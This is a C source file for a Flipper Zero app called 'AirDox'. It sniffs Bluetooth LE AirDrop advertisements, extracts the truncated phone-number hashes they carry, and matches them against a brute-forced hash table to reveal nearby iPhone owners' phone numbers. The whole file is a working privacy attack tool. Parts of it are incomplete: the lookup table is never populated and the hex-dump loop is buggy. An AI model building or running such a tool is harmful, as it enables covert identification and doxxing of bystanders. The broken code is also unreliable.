#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>
#include <furi_hal_bt.h>
#include <furi_hal_light.h>
#include <dialogs/dialogs.h>
#include <storage/storage.h>
#include <toolbox/stream/buffered_file_stream.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tiny_e164.h"
#include "picohash.h"

#define TAG "AirDox"
#define MAX_HASHES 100
#define MAX_LOG_LINES 10
#define MAX_EXTRACTED_HASHES 8
#define MAX_PHONE_NUMBERS 1000
#define APPLE_COMPANY_ID 0x004C
#define AIRDROP_TYPE 0x05

// ------------------- Phone hash database -------------------
typedef struct {
    uint8_t hash[2];
    char phone[17];
} phone_hash_lookup_t;

typedef struct {
    phone_hash_lookup_t* entries;
    size_t count;
    size_t capacity;
} phone_hash_db_t;

static int phone_hash_db_init(phone_hash_db_t* db) {
    if(!db) return -1;
    db->entries = NULL;
    db->count = 0;
    db->capacity = 0;
    return 0;
}

static void phone_hash_db_free(phone_hash_db_t* db) {
    if(db && db->entries) free(db->entries);
    db->entries = NULL;
    db->count = 0;
    db->capacity = 0;
}

static void phone_hash_db_add_entry(phone_hash_db_t* db, const uint8_t hash[2], const char* phone) {
    if(!db || !phone) return;
    if(db->count >= db->capacity) {
        size_t new_capacity = db->capacity ? db->capacity * 2 : 100;
        if(new_capacity > MAX_PHONE_NUMBERS) new_capacity = MAX_PHONE_NUMBERS;
        phone_hash_lookup_t* new_entries = realloc(db->entries, sizeof(phone_hash_lookup_t) * new_capacity);
        if(!new_entries) return;
        db->entries = new_entries;
        db->capacity = new_capacity;
    }
    db->entries[db->count].hash[0] = hash[0];
    db->entries[db->count].hash[1] = hash[1];
    strncpy(db->entries[db->count].phone, phone, 16);
    db->entries[db->count].phone[16] = '\0';
    db->count++;
}

static const char* phone_hash_db_lookup(phone_hash_db_t* db, const uint8_t hash[2]) {
    if(!db || !db->entries) return NULL;
    for(size_t i=0;i<db->count;i++)
        if(db->entries[i].hash[0]==hash[0] && db->entries[i].hash[1]==hash[1])
            return db->entries[i].phone;
    return NULL;
}

// ------------------- Hash / Log structures -------------------
typedef struct {
    uint8_t extracted_hashes[MAX_EXTRACTED_HASHES][2];
    uint8_t num_extracted_hashes;
    uint32_t timestamp;
    uint32_t seen_count;
    char matched_phone[17];
    char packet_data[32];
    int8_t rssi;
} HashEntry;

typedef struct {
    char log_lines[MAX_LOG_LINES][64];
    int log_count;
    int log_start;
} LogBuffer;

typedef enum {
    AppStateConfig,
    AppStateLoading,
    AppStateSniffer
} AppState;

// ------------------- Main app structure -------------------
typedef struct {
    FuriMessageQueue* input_queue;
    ViewPort* view_port;
    Gui* gui;

    HashEntry hashes[MAX_HASHES];
    size_t hash_count;
    size_t scroll_pos;

    LogBuffer log_buffer;

    bool sniffer_active;
    uint32_t packets_seen;
    uint32_t airdrop_packets_seen;
    uint32_t matches_found;

    AppState state;
    bool use_brute_force;
    char brute_force_file[256];
    int config_selection;

    phone_e164_t* phone_numbers;
    size_t phone_numbers_count;
    size_t phone_numbers_capacity;

    phone_hash_db_t hash_db;
} AppleBleHashDemo;

// ------------------- Helpers -------------------
static void add_log_message(AppleBleHashDemo* app, const char* msg) {
    if(!app) return;
    int idx = (app->log_buffer.log_start + app->log_buffer.log_count) % MAX_LOG_LINES;
    strncpy(app->log_buffer.log_lines[idx], msg, 63);
    app->log_buffer.log_lines[idx][63] = '\0';
    if(app->log_buffer.log_count < MAX_LOG_LINES) app->log_buffer.log_count++;
    else app->log_buffer.log_start = (app->log_buffer.log_start + 1) % MAX_LOG_LINES;
    view_port_update(app->view_port);
}

static void compute_phone_hash(const char* phone_number, uint8_t* hash_out) {
    const char* digits = phone_number;
    if(*digits=='+') digits++;
    picohash_ctx_t ctx;
    picohash_init_sha256(&ctx);
    picohash_update(&ctx, digits, strlen(digits));
    uint8_t full_hash[PICOHASH_SHA256_DIGEST_LENGTH];
    picohash_final(&ctx, full_hash);
    hash_out[0]=full_hash[0]; hash_out[1]=full_hash[1];
}

// ------------------- BLE Parsing -------------------
static const uint8_t* find_ad_type(const uint8_t* data,uint16_t len,uint8_t type,uint8_t* found_len) {
    uint16_t offset=0;
    while(offset<len) {
        uint8_t ad_len=data[offset];
        if(ad_len==0) break;
        if(offset+1+ad_len>len) break;
        uint8_t ad_type=data[offset+1];
        if(ad_type==type){*found_len=ad_len-1; return &data[offset+2];}
        offset+=ad_len+1;
    }
    return NULL;
}

static void sort_hashes_alphabetically(uint8_t hashes[][2], uint8_t count){
    for(uint8_t i=1;i<count;i++){
        uint8_t temp[2]; memcpy(temp,hashes[i],2); uint8_t j=i;
        uint16_t temp_val=(temp[0]<<8)|temp[1];
        while(j>0){
            uint16_t prev_val=(hashes[j-1][0]<<8)|hashes[j-1][1];
            if(prev_val<=temp_val) break;
            memcpy(hashes[j],hashes[j-1],2); j--;
        }
        memcpy(hashes[j],temp,2);
    }
}

static HashEntry* find_or_add_hash_entry(AppleBleHashDemo* app,const uint8_t extracted_hashes[][2],uint8_t num_hashes,const uint8_t* packet_data,uint16_t packet_len,int8_t rssi){
    for(size_t i=0;i<app->hash_count;i++){
        for(uint8_t h1=0;h1<app->hashes[i].num_extracted_hashes;h1++){
            for(uint8_t h2=0;h2<num_hashes;h2++){
                if(memcmp(app->hashes[i].extracted_hashes[h1],extracted_hashes[h2],2)==0){
                    app->hashes[i].timestamp=furi_get_tick()/1000;
                    app->hashes[i].seen_count++;
                    app->hashes[i].rssi=rssi;
                    return &app->hashes[i];
                }
            }
        }
    }
    if(app->hash_count<MAX_HASHES){
        HashEntry* e=&app->hashes[app->hash_count];
        e->num_extracted_hashes=num_hashes>MAX_EXTRACTED_HASHES?MAX_EXTRACTED_HASHES:num_hashes;
        for(uint8_t i=0;i<e->num_extracted_hashes;i++) memcpy(e->extracted_hashes[i],extracted_hashes[i],2);
        e->timestamp=furi_get_tick()/1000;
        e->seen_count=1; e->matched_phone[0]='\0';
        e->rssi=rssi;
        size_t show_len=packet_len>15?15:packet_len;
        for(size_t i=0;i<show_len;i++) snprintf(e->packet_data+i,3,"%02X",packet_data[i]);
        app->hash_count++; return e;
    }
    return NULL;
}

// ------------------- Sniffer callback -------------------
static void sniffer_packet_cb(const uint8_t* data,uint16_t len,int8_t rssi,void* ctx){
    AppleBleHashDemo* app=ctx; if(!app) return; app->packets_seen++;
    furi_hal_light_set(LightGreen,0xFF); furi_delay_ms(25); furi_hal_light_set(LightGreen,0x00);
    if(len<14||data[0]!=0x04||data[1]!=0x3E||data[3]!=0x02) return;
    const uint8_t* ad_data=data+14; uint8_t ad_len=data[13]; if(len<14+ad_len) return;
    uint8_t mfg_len=0; const uint8_t* mfg=find_ad_type(ad_data,ad_len,0xFF,&mfg_len);
    if(!mfg||mfg_len<2) return;
    uint16_t company_id=mfg[0]|(mfg[1]<<8); if(company_id!=APPLE_COMPANY_ID) return;
    const uint8_t* apple_data=mfg+2; uint8_t apple_len=mfg_len-2;
    uint8_t offset=0;
    while(offset+1<apple_len){
        uint8_t type=apple_data[offset],type_len=apple_data[offset+1];
        if(offset+2+type_len>apple_len) break;
        if(type==AIRDROP_TYPE){
            uint8_t extracted[MAX_EXTRACTED_HASHES][2]; uint8_t num_extracted=0;
            if(type_len>=15){
                for(uint8_t pos=11;pos+1<type_len&&num_extracted<MAX_EXTRACTED_HASHES;pos+=2){
                    extracted[num_extracted][0]=apple_data[offset+2+pos];
                    extracted[num_extracted][1]=apple_data[offset+2+pos+1];
                    num_extracted++;
                }
                sort_hashes_alphabetically(extracted,num_extracted);
                const char* matched=NULL;
                if(app->use_brute_force&&app->hash_db.count>0){
                    for(uint8_t i=0;i<num_extracted;i++){
                        matched=phone_hash_db_lookup(&app->hash_db,extracted[i]);
                        if(matched) break;
                    }
                }
                HashEntry* e=find_or_add_hash_entry(app,extracted,num_extracted,data,len,rssi);
                if(matched&&e){strncpy(e->matched_phone,matched,16); e->matched_phone[16]='\0'; app->matches_found++;
                    furi_hal_light_set(LightRed,0xFF); furi_delay_ms(100); furi_hal_light_set(LightRed,0x00);}
            }
        }
        offset+=2+type_len;
    }
}

// ------------------- Input / Draw -------------------
static void input_cb(InputEvent* evt,void* ctx){AppleBleHashDemo* app=ctx; furi_message_queue_put(app->input_queue,evt,0);}
static void draw_cb(Canvas* canvas,void* ctx){
    AppleBleHashDemo* app=ctx;
    canvas_clear(canvas); canvas_set_color(canvas,ColorBlack);
    canvas_set_font(canvas,FontPrimary); canvas_draw_str_aligned(canvas,64,2,AlignCenter,AlignTop,"AirDox Sniffer");
    char buf[32]; snprintf(buf,sizeof(buf),"P:%luk",app->packets_seen/1000); canvas_draw_str_aligned(canvas,100,2,AlignLeft,AlignTop,buf);
}

// ------------------- App -------------------
int32_t apple_ble_hash_demo_app(void* p){
    UNUSED(p);
    AppleBleHashDemo* app=malloc(sizeof(AppleBleHashDemo));
    if(!app) return -1; memset(app,0,sizeof(AppleBleHashDemo));
    app->view_port=view_port_alloc(); app->input_queue=furi_message_queue_alloc(8,sizeof(InputEvent));
    app->state=AppStateSniffer; view_port_draw_callback_set(app->view_port,draw_cb,app);
    view_port_input_callback_set(app->view_port,input_cb,app);
    app->gui=furi_record_open("gui"); gui_add_view_port(app->gui,app->view_port,GuiLayerFullscreen);
    furi_hal_bt_reinit(); furi_hal_bt_start_rx(sniffer_packet_cb,app); app->sniffer_active=true;
    InputEvent input; bool exit_loop=false;
    while(!exit_loop){if(furi_message_queue_get(app->input_queue,&input,10)==FuriStatusOk){
        if(input.type==InputTypePress){switch(input.key){case InputKeyBack: exit_loop=true; break; default: break;}}}
        furi_delay_ms(10); view_port_update(app->view_port);}
    if(app->sniffer_active) furi_hal_bt_stop_rx();
    gui_remove_view_port(app->gui,app->view_port); furi_record_close("gui");
    view_port_free(app->view_port); furi_message_queue_free(app->input_queue);
    phone_hash_db_free(&app->hash_db); if(app->phone_numbers) free(app->phone_numbers); free(app);
    return 0;
}
